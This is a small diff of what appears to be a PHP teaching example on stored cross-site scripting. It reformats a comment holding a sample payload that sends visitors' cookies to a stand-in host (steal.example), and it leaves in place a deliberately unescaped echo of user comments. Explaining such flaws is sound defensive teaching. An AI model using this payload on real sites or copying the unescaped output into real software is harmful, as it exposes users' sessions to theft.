@@ -43,7 +43,9 @@ $pdo->prepare("INSERT INTO comments (text) VALUES (?)")->execute([$comment]);
 
 // DANGEROUS: redisplayed later, with no escaping
 foreach ($comments as $c) {
-    echo $c['text'];  // if an attacker posted <script>document.location='https://steal.example/?c='+document.cookie</script>,
+    // if an attacker posted
+    // <script>document.location='https://steal.example/?c='+document.cookie</script>,
+    echo $c['text'];
                        // THIS CODE RUNS for EVERY visitor who sees this comment
 }
 
